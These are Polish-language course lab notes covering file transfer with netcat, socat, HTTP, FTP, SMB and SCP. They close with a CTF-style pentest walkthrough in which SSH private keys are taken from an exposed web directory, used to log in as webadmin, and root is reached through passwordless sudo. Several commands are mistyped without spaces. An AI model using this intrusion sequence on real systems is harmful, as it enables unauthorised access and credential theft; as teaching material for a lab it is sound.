# Netcat
## TCP
### Download
Ściągnięcie pliku hostowanego przez maszynę 192.168.100.5 na porcie 10001/tcp.  
`nc 192.168.100.5 10001 > tcpconnect.png`  
albo  
`socat-u tcp-connect:192.168.100.5:10001 open:tcpconnect.png,creat`
### Upload
Wysłanie pliku z poprzedniego zadania na port 20001/tcp do hosta 192.168.100.5.  
`cat tcpconnect.png | nc 192.168.100.5 20001`  
alternatywnie socat:  
`socat -u file:tcpconnect.png tcp-listen:20001,reuseaddr`
___
## UDP
### Download
Ściągnięcie pliku hostowanego przez maszynę 192.168.100.5 na porcie 10002/udp.  
`echo | nc -u 192.168.100.5 10002 -w 5 > udpconnect.png`  
### Upload
Wysłanie pliku z poprzedniego zadania na port 20002/udp do hosta 192.168.100.5.  
`cat udpconnect.png |  nc-u 192.168.100.5 20002 -w 5`  
___
## TCP listen
### Download
Ściągnięcie pliku wysyłanego co około 30 sekund na port 10003/tcp na maszynę (Twoją) podłączoną do sieci VPN.  
`nc -lvp 10003 > tcplisten.png`  
### Upload
Zahostowanie pliku z poprzedniego zadania na porcie 20003/tcp na maszynie (Twojej) podłączonej do sieci VPN.  
`cat tcplisten.png |  nc-lvp 20003`  
___
## UDP listen
### Download
Ściągnięcie pliku wysyłanego co około 30 sekund na port 10004/udp na maszynę (Twoją) podłączoną do sieci VPN.  
Po otrzymaniu komunikatu o nawiązaniu połączenia możemy wcisnąć kombinację CTRL-C lub poczekać na timeout (-w 30).  
`nc-luvp 10004 -w 30 > udplisten.png`  
### Upload
Zahostowanie pliku z poprzedniego zadania na porcie 20004/udpna maszynie (Twojej) podłączonej do sieci VPN.  
`cat udplisten.png |  nc -ulvp 20004` #CTRL-C po pojawieniu się napisu „UPLOADED”  
___
## HTTP/HTTPS
### Serwer HTTP (Python)
Uruchomienie serwera HTTP na porcie 80 za pomocą Pythona:  
`python3 -m http.server 80`  
### Serwer HTTP (Apache)
Uruchomienie serwera HTTP Apache2 na porcie 80:  
```
sudo apt update && sudo apt install apache2 #jeżeli apache2 
nie jest zainstalowany
sudo systemctl start apache2
```
### Serwer HTTPS (Apache)
Uruchomienie serwera HTTPS Apache2 na porcie 443:  
```
sudo a2enmod ssl
sudo a2ensite default-ssl.conf
sudo systemctl restart apache2
```
___
## FTP
### Serwer FTP (Python)
Uruchomienie serwera FTP na porcie 21 za pomocą Pythona:  
```
sudo apt update && sudo apt install python3-pyftpdlib
 python3 -m pyftpdlib-p 21
```
___
## SMB
### Serwer SMB (Python)
Uruchomienie serwera SMB na porcie 445 za pomocą Pythona:  
```
locate smbserver.py #skrypt domyślnie zainstalowany na Kali
sudo apt install python3-impacket #komenda do instalacji, jeżeli skrypt nie istnieje
python3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 0.0.0.0 -smb2support pjatksmbshare /home/student
# użycie skryptu smbserver.py może różnić się od użytej wersji. Zaleca się wykorzystanie przełącznika --help w razie 
problemów.

Gdzie:-ip 0.0.0.0 – oznacza nasłuchiwanie na wszystkich interfejsach-smb2suport – oznacza włączenie wsparcia dla nowszej wersji protokołu SMB
pjatksmbshare– dowolna nazwa udostępnianego zasobu
/home/student – ścieżka udostępnianego katalogu
```
___
## SCP
### Serwer SSH (SCP)
Uruchomienie serwera SSH (SCP) na porcie 22:  
```
sudo apt install openssh-server #jeżeli serwer nie jest zainstalowany
sudo systemctl start ssh
```
___
## Ćwiczenia Pentest
1. Celem zadania jest ściągnięcie na Kali statycznej wersji narzędzia Nmap:  
`wget https://github.com/opsec-infosec/nmap-static-binaries/releases/download/v2/nmap-x64.tar.gz`  
Następnie przeniesienie go w ulubiony sposób na maszynę 192.168.100.5  
`scp nmap-x64.tar.gz student@192.168.100.5:/home/student`  

Po przekopiowaniu archiwum, łączymy się na maszynę za pomocą ssh i wypakowujemy archiwum:  
ssh student@192.168.100.5 #łączymysięzmaszyną192.168.100.5, gdziewgraliśmy Nmap. Hasło: pjatk  
tar zxvf nmap-x64.tar.gz#wypakowanie plikówzarchiwumtar.gznamaszynie 192.168.100.5  

2. Celem zadania jest przeskanowanie maszyny 192.168.200.55 z uwzględnieniem  
 wykrycia wersji usług. Skan uruchamiamy na maszynie 192.168.100.5:  
``` ./nmap-n -Pn-sV-p--vv 192.168.200.55
-n – nie odpytuje DNS,  
-Pn– traktuje hosta jako online, 
-sV– szuka usług (TCP) i ich wersji,
-p- -skanuje wszystkie porty (TCP),
-vv– odpowiada za pokazywanie wyników w czasie rzeczywistym (w trakcie skanowania),
192.168.200.55– adres IP celu. 
```
Skan powinien wykryć usługę webową. Za pomocą curl lub wget możemy  
wyświetlić jej zawartość:  
``` 
curl 192.168.200.55
wget-O - 192.168.200.55
```

3. Celem zadania jest pobranie pary kluczy SSH, które są widoczne na listingu plików w zahostowanym katalogu domowym  
` wget-r --no-parent http://192.168.200.55`  
Komenda wget stworzy katalog o nazwie 192.168.200.55, do którego zapisze wszystkie pliki z serwera webowego:  
` ls-la 192.168.200.55/`

4. Celem zadania jest zalogowanie się do maszyny 192.168.200.55 za pomocą  
zdobytego klucza ssh. Aby się zalogować, musimy znać nazwę użytkownika właściciela klucza. Nazwa ta jest często zapisana w komentarzu klucza  
publicznego:  
`cat ~/192.168.200.55/.ssh/id_ed25519.pub`  
Klucz prywatny musi posiadać bezpieczne uprawnienia, aby móc się nim zalogować:
```
chmod 600 ./192.168.200.55/.ssh/id_ed25519
ssh-i ~/192.168.200.55/.ssh/id_ed25519 webadmin@192.168.200.55 #nazwę 
webadminpoznaliśmy z komentarza w kluczu publicznym
```

5. Ostatnim krokiem jest eskalacja uprawnień do użytkownika root oraz przeczytanie  
flagi z katalogu domowego użytkownika root. Użytkownik webadmin posiada  
możliwość uruchamiania sudo bez hasła, co można wykorzystać do eskalacji:  
```
id
sudo-l
sudo su
```
Ostatnim krokiem jest odczytanie flagi ukrytej w katalogu domowym użytkownika root:  
`cat /root/root.txt`  